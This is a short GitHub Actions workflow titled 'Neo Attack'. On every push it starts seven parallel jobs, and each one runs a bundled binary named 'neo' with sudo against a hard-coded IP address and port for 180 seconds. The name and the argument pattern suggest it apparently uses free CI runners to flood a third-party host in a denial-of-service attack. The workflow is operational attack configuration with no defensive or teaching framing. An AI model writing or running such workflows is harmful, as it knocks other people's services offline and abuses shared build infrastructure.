name: Neo Attack
on: [push]

jobs:
  neo:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x neo
    - run: sudo ./neo 103.123.54.223 10017 180 999
